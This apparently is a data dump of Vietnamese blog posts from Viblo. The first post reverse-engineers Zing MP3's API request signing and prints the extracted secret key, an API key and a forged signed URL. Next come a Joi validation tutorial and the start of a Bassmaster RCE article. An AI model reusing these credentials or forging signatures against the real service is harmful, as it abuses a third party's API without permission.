\u0111\u00edch c\u1ee7a ch\u00fang ta)\n![](https://images.viblo.asia/5ee03c81-cb16-450f-a843-37daea68c509.PNG)\n\nOkay, kh\u00e1m ph\u00e1 API \u0111\u00f3 n\u00e0o\n![](https://images.viblo.asia/cf14bb51-40a0-4020-b772-4ad0a40484a0.PNG)\n\u1ede \u0111\u00e2y ch\u00fang ta th\u1ea5y,  API n\u00e0y c\u00f3 4 query params \u0111\u00f3 l\u00e0 \n> - id (id c\u1ee7a b\u00e0i h\u00e1t, \u0111\u1eebng c\u1ed1 t\u00ecm hi\u1ec3u n\u00f3,  ch\u00fang ta ch\u1ea3 bao gi\u1edd hi\u1ec3u \u0111\u01b0\u1ee3c \u0111\u00e2u =)) )\n> - ctime (ch\u00ednh l\u00e0 timestamp th\u1eddi \u0111i\u1ec3m ch\u00fang ta fuck API)\n> - sig=1 chu\u1ed7i g\u00ec \u0111\u00f3 , t\u1ea1m g\u1ecdi n\u00f3 l\u00e0 "signature" t\u1ee9c l\u00e0 ch\u1eef k\u00fd, t\u00ed n\u1eefa t\u00f4i ph\u00e2n t\u00edch n\u00f3 sau\n> - key= API key hehehe (th\u1eb1ng n\u00e0y trong c\u00e1c XHR kh\u00e1c c\u0169ng d\u00f9ng y key nh\u01b0 v\u1eady, n\u00ean n\u00f3 l\u00e0 const, ta b\u1ee3 n\u00f3 n\u00e0o)\n\nOkay, v\u1eady 4 tham s\u1ed1 tr\u00ean ch\u1ec9 c\u00f3 th\u1eb1ng "sig" l\u00e0 c\u00f3 v\u1ea5n \u0111\u1ec1, v\u00ec sao ? V\u00ec n\u1ebfu ta \u0111em y c\u00e1i url \u0111\u00f3 \u0111i request th\u00ec ra info, nh\u01b0ng thay th\u1eb1ng sig th\u00ec b\u1ecb \u0103n bad request ngay ! \nV\u1eady m\u1ee5c \u0111\u00edch ch\u00ednh c\u1ee7a ch\u00fang ta l\u00e0 t\u00ecm c\u00e1ch t\u1ea1o ra th\u1eb1ng sig n\u00e0y\nPh\u00e2n t\u00edch n\u00f3, t\u00f4i th\u1ea5y n\u00f3 ch\u1ee9a 128 k\u00fd t\u1ef1, \u0111\u1eb9p qu\u00e1, k\u00fd t\u1ef1 l\u1ea1i to\u00e0n l\u00e0 c\u00e1c anh b\u1ea1n trong b\u1ea3ng m\u00e3 ASCII, l\u1ea1i to\u00e0n l\u00e0 anh em lowercase, hehe c\u00f3 khi SHA512 r\u1ed3i, note l\u1ea1i \u0111\u00e3\nB\u00e2y gi\u1edd, t\u00ecm t\u1edbi c\u00e1ch n\u00f3 ch\u1ebf bi\u1ebfn c\u00e1i sig n\u00e0y, ta th\u1ea5y trong query params c\u00f3 "id" v\u00e0 "ctime", nh\u01b0ng t\u1eeb "id" n\u1ebfu search trong source th\u00ec ch\u1eafc v\u1ee1 m\u1ed3m v\u00ec \u0111\u1ed9 nhi\u1ec5u k\u1ebft qu\u1ea3, n\u00ean ta s\u1ebd l\u1ea5y "ctime" \u0111\u1ec3 trace\n\n\u0110\u00e2y l\u00e0 l\u00fac t\u1ea1i sao t\u00f4i gi\u1ea3i th\u00edch anh em ph\u1ea3i d\u00f9ng giao di\u1ec7n desktop \u0111\u00e2y, v\u00ec c\u00f3 v\u1eady ta m\u1edbi l\u00f4i ra \u0111\u01b0\u1ee3c file "main.min.js" n\u1eb1m trong th\u01b0 m\u1ee5c "zjs.zadn.vn\\**zmp3-desktop**\\release\\vx.x.x\\static\\js"\n![](https://images.viblo.asia/b9396f48-e6e4-45c2-b09e-597715f4231c.PNG)\nOkay, b\u1ea5m Pretty \u0111\u1ec3 format l\u1ea1i code cho d\u1ec5 \u0111\u1ecdc, b\u1ea5m Ctrl+F v\u00e0 search "ctime"\n![](https://images.viblo.asia/3ac58e36-7c26-453c-a65d-5c19e2205ba1.PNG)\n\nNh\u00ecn v\u00e0o line 501, th\u1ea5y "t.sig", \u0111\u1eb7t break point \u1edf \u0111\u00e2y v\u00e0 b\u1ea5m ch\u1ecdn b\u00e0i h\u00e1t kh\u00e1c n\u00e0o\n![](https://images.viblo.asia/301a134e-40ec-4706-9892-1dde9c8133b4.PNG)\nBreak-point \u0111\u01b0\u1ee3c freeze, data \u0111\u01b0\u1ee3c push l\u00ean cho ch\u00fang ta th\u1ea5y\n\u0110\u1ea1i kh\u00e1i, function T s\u1ebd nh\u1eadn v\u00e0o 2 tham s\u1ed1 l\u00e0 e v\u00e0 t trong \u0111\u00f3\n- e ch\u1ee9a path c\u1ee7a API\n- t ch\u1ee9a object v\u1edbi n\u1ed9i dung l\u00e0 id v\u00e0 ctime\n- t.sig s\u1ebd g\u1ecdi h\u00e0m S(e,t), hover chu\u1ed9t v\u00e0o h\u00e0m S ta th\u1ea5y n\u00f3 \u0111\u01b0\u1ee3c declare \u1edf line 486\n![](https://images.viblo.asia/a7b24009-8a0c-4164-8e38-47d3e164abb0.PNG)\nSet break-point \u1edf d\u00f2ng 489 (k\u1ebft qu\u1ea3 tr\u1ea3 v\u1ec1 c\u1ee7a h\u00e0m S) sau \u0111\u00f3 nh\u1ea5n F9\n![](https://images.viblo.asia/3927f552-5ab6-46e8-b52a-3b9f295e71fb.PNG)\nTa s\u1ebd \u0111\u01b0\u1ee3c freeze t\u1ea1i 489 v\u00e0 th\u1ea5y k\u1ebft qu\u1ea3 tr\u1ea3 v\u1ec1 nh\u01b0 tr\u00ean\n> - bi\u1ebfn n s\u1ebd \u0111\u01b0\u1ee3c bi\u1ebfn t\u1ea5u l\u1ea1i, th\u00e0nh "ctime=xxxxid=yyyy"\n> - bi\u1ebfn r s\u1ebd ch\u1ee9a gi\u00e1 tr\u1ecb l\u00e0 1 h\u00e0m h(), h\u00e0m n\u00e0y nh\u1eadn tham s\u1ed1 l\u00e0 chu\u1ed7i n\n> - Ta th\u1ea5y bi\u1ebfn r c\u00f3 sig bytes l\u00e0 32, l\u00fac n\u00e3y ta c\u00f3 note c\u00e1i sig ho\u00e0n thi\u1ec7n l\u00e0 SHA512, SHA512 tr\u1ea3 v\u1ec1 64bytes, \u1edf \u0111\u00e2y nh\u1eadn \u0111\u01b0\u1ee3c 32 bytes t\u1ee9c n\u00f3 c\u00f3 th\u1ec3 l\u00e0 SHA256\n> - C\u00f3 bi\u1ebfn r r\u1ed3i th\u00ec h\u00e0m n\u00e0y s\u1ebd g\u1ecdi \u0111\u1ebfn h\u00e0m m v\u1edbi tham s\u1ed1 l\u00e0 (e+r,b.Oc), e th\u00ec ta c\u00f3 l\u00e0 API path r\u1ed3i, r ta c\u0169ng c\u00f3 l\u00e0 SHA256(n), b.0c th\u00ec hover chu\u1ed9t v\u00e0o s\u1ebd th\u1ea5y\n![](https://images.viblo.asia/e6601ee1-7b4e-41a5-8aa0-41d4f4f142ac.PNG)\nV\u1eady, ta r\u00fat ra, h\u00e0m m n\u00e0y l\u00e0 SHA512 (note \u1edf tr\u00ean), tham s\u1ed1 c\u1ee7a n\u00f3 l\u00e0 API path + SHA256(n) v\u00e0 SECRET KEY (b.Oc)\n\nTh\u1eed xem nh\u00e9, t\u00f4i l\u01b0\u1eddi n\u00ean ch\u1ea1y lu\u00f4n complier tr\u00ean tr\u00ecnh duy\u1ec7t, m\u1edf https://repl.it/languages/nodejs l\u00ean v\u00e0 declare\n```\nconst crypto = require(\'crypto\');\n\n\nconst getHash256 = (a) => {\n    return crypto.createHash(\'sha256\').update(a).digest(\'hex\');\n}\nconst getHmac512 = (str, key) => {\n    let hmac = crypto.createHmac("sha512", key);\n    return hmac.update(Buffer.from(str, \'utf8\')).digest("hex");\n}\n```\nSau \u0111\u00f3 b\u1ea5m run\n![](https://images.viblo.asia/07ed76dd-6342-4e57-b2db-97c1e212f3ec.PNG)\n\nR\u1ed3i, b\u00e2y gi\u1edd ta s\u1ebd ti\u1ebfn h\u00e0nh l\u1ea5y c\u00e1i SHA256 c\u1ee7a (n) nh\u00e9, t\u00f4i s\u1ebd l\u1ea5y l\u1ea1i tham s\u1ed1 \u0111\u00e3 fetch l\u00fac \u0111\u1ea7u\n![](https://images.viblo.asia/ed1366da-8f5c-483c-b9d6-75fca4932cbc.PNG)\n\n\nTi\u1ebfp theo, ta g\u1ecdi SHA512(e+r,secret) nh\u00e9\n![](https://images.viblo.asia/ac4d64d6-5b07-4092-8220-0115a82ce1d2.PNG)\n\nNh\u1edb r\u1eb1ng c\u00e1i chu\u1ed7i **10a01dcf33762d3a204cb96429918ff6** l\u00e0 SECRET KEY ta l\u1ea5y \u0111\u01b0\u1ee3c l\u00fac n\u00e3y r\u1ed3i nh\u00e9\nB\u00e2y gi\u1edd c\u00f3 sig r\u1ed3i, \u0111em replace v\u00e0o link API sau xem sao\nhttps://zingmp3.vn/api/song/get-streamings-beat?id=ZOW0OBU8&ctime=1607185070&sig=716b083eea082f38c8eb2ad5aa1023120199bd906a30a6dd533c4987ba473a7eeb0e2b58c5a8d7c69a563bffb4648ad1762fff78298d1c043f0c542d3c92ee68&api_key=38e8643fb0dc04e8d65b99994d3dafff\n![](https://images.viblo.asia/84de8ec2-30b3-4c2a-ba8e-97a7163c5791.PNG)\n\u01a0 l\u1ed7i ??? B\u00ecnh t\u0129nh, nh\u00ecn c\u00e1i timestamp k\u00eca, n\u00e3y ch\u00fang ta sinh c\u00e1i signature v\u1edbi timestamp kh\u00e1c m\u00e0 ^^, h\u00e3y correct l\u1ea1i c\u00e1i url tr\u00ean n\u00e0y\n\nhttps://zingmp3.vn/api/song/get-streamings-beat?id=ZOW0OBU8&ctime=**160718421**&sig=716b083eea082f38c8eb2ad5aa1023120199bd906a30a6dd533c4987ba473a7eeb0e2b58c5a8d7c69a563bffb4648ad1762fff78298d1c043f0c542d3c92ee68&api_key=38e8643fb0dc04e8d65b99994d3dafff\n![](https://images.viblo.asia/84de8ec2-30b3-4c2a-ba8e-97a7163c5791.PNG)\nThay \u0111\u00fang v\u1edbi c\u00e1i ctime ta \u0111\u00e3 encrypt trong bi\u1ebfn \'r\' v\u00e0 ch\u1ea1y l\u1ea1i link xem sao :D\n![](https://images.viblo.asia/f8879d2f-dd83-4450-8b2c-28da3356e6ed.PNG)\n\u0110\u00e3 thay nh\u01b0ng v\u1eabn l\u1ed7i =)), \u0111\u00f9i gh\u00ea ri b\u00e2y ! Hehe, b\u00ecnh t\u0129nh, nh\u1edb r\u1eb1ng sig l\u00e0 k\u1ebft qu\u1ea3 c\u1ee7a e v\u00e0 r, e \u1edf \u0111\u00e2y l\u00e0 API path, n\u00e3y ta sinh signature cho api /get-song-info m\u00e0 sao gi\u1edd d\u00e1m d\u00f9ng api /get-streamings-beat g\u1ecdi \u0111\u01b0\u1ee3c, l\u1ea1i correct url n\u00e0o\nhttps://zingmp3.vn/api/song/get-song-info?id=ZOW0OBU8&ctime=160718421&sig=716b083eea082f38c8eb2ad5aa1023120199bd906a30a6dd533c4987ba473a7eeb0e2b58c5a8d7c69a563bffb4648ad1762fff78298d1c043f0c542d3c92ee68&api_key=38e8643fb0dc04e8d65b99994d3dafff\n\nTa \u0111\u01b0\u1ee3c\n![](https://images.viblo.asia/bc27352d-7c75-4e9a-a1f4-8383f10f0530.PNG)\n\nV\u1eady, ta r\u00fat ra r\u1eb1ng, sig ch\u00ednh l\u00e0 chu\u1ed7i ch\u1ee9a th\u00f4ng tin x\u00e1c th\u1ef1c request API bao g\u1ed3m (song id, ctime v\u00e0 api path). V\u1eady gi\u1edd mu\u1ed1n s\u1eed d\u1ee5ng c\u00e1i /get-stream-beats th\u00ec ta c\u1ee9 l\u00e0m l\u1ea1i c\u00e1c b\u01b0\u1edbc l\u00fac n\u00e3y \u0111\u1ec3 sinh sig cho API n\u00e0y th\u00f4i !\nNh\u01b0ng t\u1ed9i g\u00ec, trong c\u00e1i json l\u00fac n\u00e3y c\u1ee7a get-song-info \u0111\u00e3 tr\u1ea3 v\u1ec1 url stream trong \u0111\u00f3 r\u1ed3i ^^ ko c\u00f3 320kbs th\u00f4i, mu\u1ed1n c\u00f3 th\u00ec explore c\u00e1i API get-streams xem sao nh\u00e9\n![](https://images.viblo.asia/dbdd6133-7d2f-4318-9ae5-248ddd7d737c.PNG)\n\nOkay ! B\u00e0i vi\u1ebft c\u1ee7a m\u00ecnh c\u0169ng kh\u00e1 d\u00e0i, v\u00e0 gi\u1edd l\u00e0 12h10 P.M, m\u00ecnh c\u0169ng n\u00ean d\u1eebng b\u00fat v\u00e0 \u0111i ng\u1ee7 th\u00f4i, ch\u00fac c\u00e1c b\u1ea1n th\u00e0nh c\u00f4ng nha :D',
      published_at: "2020-12-06 00:12:36",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 11:03:08",
      translation_source: null,
      trend_at: "2020-12-14 16:58:03",
      promoted_at: null,
      reading_time: 9,
      points: 43,
      views_count: 6252,
      clips_count: 20,
      comments_count: 8,
      rated_value: null,
      promoted: true,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://cdn.tgdd.vn/2020/03/campaign/zingmp3-640x360-1.jpg",
      user: {
        data: {
          id: 5509,
          url: "https://viblo.asia/u/eddydn",
          avatar: "dd4be17e-8516-4e17-824a-978b06c5231d.jpg",
          name: "Ho\u00e0ng Linh",
          username: "eddydn",
          followers_count: 22,
          reputation: 531,
          posts_count: 9,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "restful-api",
            name: "Restful API",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=Restful+API&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "mp3zingvn",
            name: "mp3.zing.vn",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=mp3zingvn&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "reverse",
            name: "reverse",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=reverse&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 5507,
            url: "https://viblo.asia/u/blacker",
            avatar: "c42ea4af-1f46-4763-b31d-cc638dc5f861.jpg",
            name: "S\u1ea7u \u0110\u1ed9c C\u00f4",
            username: "blacker",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 5509,
            url: "https://viblo.asia/u/eddydn",
            avatar: "dd4be17e-8516-4e17-824a-978b06c5231d.jpg",
            name: "Ho\u00e0ng Linh",
            username: "eddydn",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 26245,
            url: "https://viblo.asia/u/timlai89",
            avatar: "9ab0bcfd-e118-4d08-afaa-94b0b7eb5d86.jpg",
            name: "Hieu Nguyen",
            username: "timlai89",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 41037,
            url: "https://viblo.asia/u/haipham22",
            avatar: "db1ede1f-607f-46f5-bc4b-1f09ba587393.png",
            name: "H\u1ea3i Ph\u1ea1m",
            username: "haipham22",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 51503,
            url: "https://viblo.asia/u/phi.lk",
            avatar: "461562d6-8310-48cf-8645-427342a40bd4.jpg",
            name: "Do Long",
            username: "phi.lk",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 52896,
            url: "https://viblo.asia/u/myhn",
            avatar: "bb762134-6ffe-48a6-afa3-871914a4e5fb.png",
            name: "Hu\u1ef3nh Ng\u1ecdc M\u1ef9",
            username: "myhn",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 48265,
      title: "Verify JSON request NodeJS v\u1edbi JOI",
      slug: "V3m5WLpgKO7",
      url:
        "https://viblo.asia/p/verify-json-request-nodejs-voi-joi-V3m5WLpgKO7",
      user_id: 50683,
      moderation: null,
      transliterated: "verify-json-request-nodejs-voi-joi",
      contents_short:
        "T\u1ea1i sao ph\u1ea3i verify JSON tr\u01b0\u1edbc khi x\u1eed l\u00fd?\nTrong qu\u00e1 trinh vi\u1ebft m\u1ed9t API m\u1ecdi ng\u01b0\u1eddi th\u01b0\u1eddng nh\u1eadn request sau \u0111\u00f3 bay ngay v\u00e0o x\u1eed l\u00fd sau \u0111\u00f3 n\u1ebfu c\u00f3 exception th\u00ec tr\u1ea3 v\u1ec1 response l\u1ed7i. \u0110i\u1ec1u n\u00e0y l\u00e0 kh\u00f4ng t\u1ed1t...",
      contents:
        "## T\u1ea1i sao ph\u1ea3i verify JSON tr\u01b0\u1edbc khi x\u1eed l\u00fd?\nTrong qu\u00e1 trinh vi\u1ebft m\u1ed9t API m\u1ecdi ng\u01b0\u1eddi th\u01b0\u1eddng nh\u1eadn request sau \u0111\u00f3 bay ngay v\u00e0o x\u1eed l\u00fd sau \u0111\u00f3 n\u1ebfu c\u00f3 exception th\u00ec tr\u1ea3 v\u1ec1 response l\u1ed7i. \u0110i\u1ec1u n\u00e0y l\u00e0 kh\u00f4ng t\u1ed1t! M\u1ed9t s\u1ed1 l\u00fd do ch\u00fang ta n\u00ean verify request json tr\u01b0\u1edbc khi x\u1eed l\u00fd c\u00e1c function ch\u00ednh:\n- Verify nhanh v\u00e0 tr\u1ea3 v\u1ec1 k\u1ebft qu\u1ea3 khi json input kh\u00f4ng \u0111\u00fang v\u1edbi c\u1ea5u tr\u00fac d\u1eef li\u1ec7u c\u1ea7n c\u00f3.\n- H\u1ea1n ch\u1ebf c\u00e1 exeption, ti\u00eau bi\u1ec3u nh\u1ea5t l\u00e0 null exeption. v\u00ed d\u1ee5, ch\u00fang ta s\u1eed d\u1ee5ng people.child.nephew m\u00e0 ng\u01b0\u1eddi d\u00f9ng truy\u1ec1n v\u00e0o child l\u00e0 null ch\u00fang ra kh\u00f4ng th\u1ec3 \u0111\u1eb7t if tr\u01b0\u1edbc t\u1ea5t c\u1ea3 c\u00e1c properties mu\u1ed1n l\u1ea5y value \u0111\u1ec3 ki\u1ec3m tra gi\u00e1 tr\u1ecb.\n- H\u1ea1n ch\u1ebf nh\u1eefng x\u1eed l\u00fd kh\u00f4ng c\u1ea7n thi\u1ebft khi ng\u01b0\u1eddi d\u00f9ng input gi\u00e1 tr\u1ecb sai. Thay v\u00ec vi\u1ec7c x\u1eed l\u00fd c\u00e1c b\u01b0\u1edbc cho \u0111\u1ebfn l\u00fac g\u1eb7p data b\u1ecb sai r\u1ed3i response exception th\u00ec ki\u1ec3m tra m\u1ed9t v\u00f2ng tr\u01b0\u1edbc \u0111\u1ec3 \u0111\u1ea3m b\u1ea3o data input \u0111\u00fang tr\u01b0\u1edbc khi x\u1eed l\u00fd.\n- \u0110\u1ea3m b\u1ea3o s\u1ef1 to\u00e0n v\u1eb9n d\u1eef li\u1ec7u, h\u1ea1n ch\u1ebf vi\u1ec7c rollback d\u1eef li\u1ec7u \u1edf database. V\u00ed d\u1ee5 nh\u01b0 \u1edf v\u00ed d\u1ee5 tr\u01b0\u1edbc khi nh\u1eadn request ch\u00fang ta l\u01b0u People v\u00e0o m\u1ed9t b\u1ea3ng trong database, sau \u0111\u00f3 l\u01b0u t\u1ea5t c\u1ea3 child v\u00e0o m\u1ed9t b\u1ea3ng kh\u00e1c. Trong tr\u01b0\u1eddng h\u1ee3p ch\u00fang ta ti\u1ebfn h\u00e0nh l\u01b0u People m\u00e0 kh\u00f4ng ki\u1ec3m tra json input tr\u01b0\u1edbc c\u00f3 th\u1ec3 data c\u1ee7a child c\u00f3 th\u1ec3 sai d\u1eabn \u0111\u1ebfn vi\u1ec7c ph\u1ea3i rollback data \u1edf database.\n## Gi\u1edbi thi\u1ec7u v\u1ec1 JOI\n```\nThe most powerful schema description language and data validator for JavaScript.\n```\n\nN\u00f3i chung joi l\u00e0 m\u1ed9t th\u01b0 vi\u1ec7n gi\u00fap b\u1ea1n c\u00f3 th\u1ec3 ki\u1ec3m tra xem c\u1ea5u tr\u00fac JSON c\u00f3 \u0111\u00fang v\u1edbi c\u1ea5u tr\u00fac b\u1ea1n mong mu\u1ed1n kh\u00f4ng? \u0111\u1ec3 c\u00e0i \u0111\u1eb7t v\u00e0 s\u1eed d\u1ee5ng joi \u1edf [\u0111\u00e2y](https://www.npmjs.com/package/joi)\n\n   C\u00e1c b\u01b0\u1edbc \u0111\u1ec3 s\u1eed d\u1ee5ng JOI\n1.    th\u00eam JOI v\u00e0o project\n```\nnpm install joi\n```\n3.    require/import joi\n```\nconst Joi = require('joi');\n```\n5.    \u0111\u1ecbnh ngh\u0129a c\u1ea5u tr\u00fac\n```\nconst schema = Joi.object({\n    username: Joi.string()\n        .alphanum()\n        .min(3)\n        .max(30)\n        .required(),\n\n    password: Joi.string()\n        .pattern(new RegExp('^[a-zA-Z0-9]{3,30}$')),\n\n    repeat_password: Joi.ref('password'),\n\n    access_token: [\n        Joi.string(),\n        Joi.number()\n    ],\n\n    birth_year: Joi.number()\n        .integer()\n        .min(1900)\n        .max(2013),\n\n    email: Joi.string()\n        .email({ minDomainSegments: 2, tlds: { allow: ['com', 'net'] } })\n})\n    .with('username', 'birth_year')\n    .xor('password', 'access_token')\n    .with('password', 'repeat_password');\n```\nv\u1edbi c\u1ea5u tr\u00fac ph\u00eda tr\u00ean:\n* `username`: ki\u1ec3m tra cho thu\u1ed9c t\u00ednh **username**\n    * `.string()`: ph\u1ea3i l\u00e0 string.\n    * `.alphanum()`: ch\u1ec9 \u0111\u01b0\u1ee3c ch\u1ee9a c\u00e1c k\u00fd t\u1ef1 ch\u1eef v\u00e0 s\u1ed1.\n    * `.min(3)`: t\u1ed1i thi\u1ec3u 3 k\u00fd t\u1ef1.\n    * `.max(30)`: t\u1ed1i \u0111a 30 k\u00fd t\u1ef1.\n    * `.required()`: b\u1eaft bu\u1ed9c ph\u1ea3i c\u00f3.\n * `password`: ki\u1ec3m tra cho thu\u1ed9c t\u00ednh **password**\n     * `.string()`: ph\u1ea3i l\u00e0 string.\n     * `.pattern(new RegExp('^[a-zA-Z0-9]{3,30}$'))`: ph\u1ea3i th\u1ea3o m\u00e3n bi\u1ec3u th\u1ee9c ch\u00ednh quy Regex (**^[a-zA-Z0-9]{3,30}$**), \u0111\u1ec3 t\u1ea1o m\u1ed9t regex t\u00ecm hi\u1ec3u th\u00eam \u1edf [\u0111\u00e2y](https://regex101.com/).\n * `repeat_password`: gi\u00e1 tr\u1ecb gi\u1ed1ng v\u1edbi gi\u00e1 tr\u1ecb c\u1ee7a `password`.\n * `access_token`: ki\u1ec3m tra cho thu\u1ed9c t\u00ednh **access_token**, kh\u00f4ng b\u1eaft bu\u1ed9c.\n     * ` [ Joi.string(),  Joi.number() ]` bao g\u1ed3m s\u1ed1 v\u00e0 ch\u1eef.\n* `birth_year`: ki\u1ec3m tra cho thu\u1ed9c t\u00ednh **birth_year**\n    * `.integer()`: l\u00e0 s\u1ed1n nguy\u00ean.\n    * ` .min(1900)`: min l\u00e0 1900.\n    * ` .max(2013),`: max l\u00e0 2013.\n* `email`: ki\u1ec3m tra cho thu\u1ed9c t\u00ednh **email**\n    * `.string()`: ph\u1ea3i l\u00e0 string.\n    * `.email({ minDomainSegments: 2, tlds: { allow: ['com', 'net'] } })`: \n        * l\u00e0 \u0111\u1ecba ch\u1ec9 email\n        *  c\u00f3 2 ph\u1ea7n t\u00ean mi\u1ec1n  v\u00ed d\u1ee5 `example.com`\n        *  ph\u1ea3i l\u00e0 t\u00ean mi\u1ec1n `.com` ho\u1eb7c `.net`\n\n7.    ki\u1ec3m tra json\n```\nschema.validate({ username: 'abc', birth_year: 1994 });\n// -> { value: { username: 'abc', birth_year: 1994 } }\n\nschema.validate({});\n// -> { value: {}, error: '\"username\" is required' }\n```\n\nB\u00e0i vi\u1ebft c\u1ee7a m\u00ecnh ch\u1ec9 l\u00e0 gi\u1edbi thi\u1ec7u c\u01a1 b\u1ea3n v\u1ec1 JOI, c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 xem th\u00eam t\u00e0i li\u1ec7u n\u00e2ng cao \u1edf [\u0111\u00e2y](https://joi.dev/api/?v=17.3.0)\n\nT\u00e0i li\u1ec7u tham kh\u1ea3o: [https://joi.dev/api/?v=17.3.0](https://joi.dev/api/?v=17.3.0)",
      published_at: "2020-11-30 14:14:34",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 11:29:05",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 3,
      points: 4,
      views_count: 384,
      clips_count: 4,
      comments_count: 4,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 50683,
          url: "https://viblo.asia/u/khanhvuquoc.1994",
          avatar: "9a5b52db-b9dd-479f-92be-f93bb90eeb7f.gif",
          name: "KhanhVQ",
          username: "khanhvuquoc.1994",
          followers_count: 4,
          reputation: 202,
          posts_count: 8,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "json",
            name: "JSON",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=JSON&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 50683,
            url: "https://viblo.asia/u/khanhvuquoc.1994",
            avatar: "9a5b52db-b9dd-479f-92be-f93bb90eeb7f.gif",
            name: "KhanhVQ",
            username: "khanhvuquoc.1994",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 51134,
            url: "https://viblo.asia/u/hai157",
            avatar: "8fac9b8f-2fd9-4603-b648-5abd79523392.jpg",
            name: "Ho\u00e0ng H\u1ea3i",
            username: "hai157",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 48936,
      title: "Khai th\u00e1c l\u1ed7 h\u1ed5ng RCE trong Bassmaster",
      slug: "naQZRMAGKvx",
      url:
        "https://viblo.asia/p/khai-thac-lo-hong-rce-trong-bassmaster-naQZRMAGKvx",
      user_id: 34742,
      moderation: null,
      transliterated: "khai-thac-lo-hong-rce-trong-bassmaster",
      contents_short:
        "![](https://images.viblo.asia/8c953486-884e-4799-9dea-c979b3653299.png)\n\n\n\nMu\u1ed1n h\u1ecdc m\u1ed9t th\u1ee9 g\u00ec \u0111\u00f3 m\u1edbi th\u1ef1c s\u1ef1 kh\u00f4ng c\u00f3 g\u00ec kh\u00f3 m\u00e0 ch\u1ec9 l\u00e0 qu\u00e1 kh\u00f3. V\u00e0 \u0111i\u1ec1u \u0111\u00f3 c\u00f2n t\u00f9y thu\u1ed9c v\u00e0o b\u1ea3n th\u00e2n ng\u01b0\u1eddi t\u00ecm hi\u1ec3u, \u0111\u1ed9 kh\u00f3 c\u1ee7a v\u1ea5n \u0111\u1ec1 c\u1ea7n t\u00ecm hi\u1ec3u v\u00e0 nhi\u1ec1u y\u1ebfu t\u1ed1 kh\u00e1ch quan kh\u00e1c. Do \u0111\u00f3 c...",
      contents:
        "![](https://images.viblo.asia/8c953486-884e-4799-9dea-c979b3653299.png)\n\nMu\u1ed1n h\u1ecdc m\u1ed9t th\u1ee9 g\u00ec \u0111\u00f3 m\u1edbi th\u1ef1c s\u1ef1 kh\u00f4ng c\u00f3 g\u00ec kh\u00f3 m\u00e0 ch\u1ec9 l\u00e0 qu\u00e1 kh\u00f3. V\u00e0 \u0111i\u1ec1u \u0111\u00f3 c\u00f2n t\u00f9y thu\u1ed9c v\u00e0o b\u1ea3n th\u00e2n ng\u01b0\u1eddi t\u00ecm hi\u1ec3u, \u0111\u1ed9 kh\u00f3 c\u1ee7a v\u1ea5n \u0111\u1ec1 c\u1ea7n t\u00ecm hi\u1ec3u v\u00e0 nhi\u1ec1u y\u1ebfu t\u1ed1 kh\u00e1ch quan kh\u00e1c. Do \u0111\u00f3 ch\u1ec9 c\u00f2n c\u00e1ch l\u00e0 h\u00e3y \u0111i v\u00e0o t\u00ecm hi\u1ec3u n\u00f3, t\u00ecm hi\u1ec3u \u0111\u1ebfn khi n\u00e0o hi\u1ec3u ra v\u1ea5n \u0111\u1ec1 th\u00ec th\u00f4i :joy:\n\nBassmaster c\u0169ng v\u1eady, l\u00fac \u0111\u1ea7u m\u1edbi \u0111\u1ee5ng v\u00e0o th\u00ec c\u0169ng ch\u1eb3ng hi\u1ec3u g\u00ec, nh\u01b0ng c\u1ee9 \u0111\u1ecdc, nghi\u00ean c\u1ee9u v\u00e0 th\u1ef1c h\u00e0nh th\u00ec cu\u1ed1i c\u00f9ng c\u0169ng hi\u1ec3u ra. Khi t\u00ecm ki\u1ebfm tr\u00ean bassmaster tr\u00ean google th\u00ec c\u0169ng kh\u00f4ng th\u1ea5y \u0111\u00e2u m\u00e0 ph\u1ea3i t\u00ecm v\u1edbi t\u1eeb kh\u00f3a bassmaster github th\u00ec m\u1edbi th\u1ea5y \u0111\u01b0\u1ee3c. Trong b\u00e0i, ta s\u1ebd ph\u00e2n t\u00edch v\u00ec sao bassmaster c\u00f3 l\u1ed7i RCE 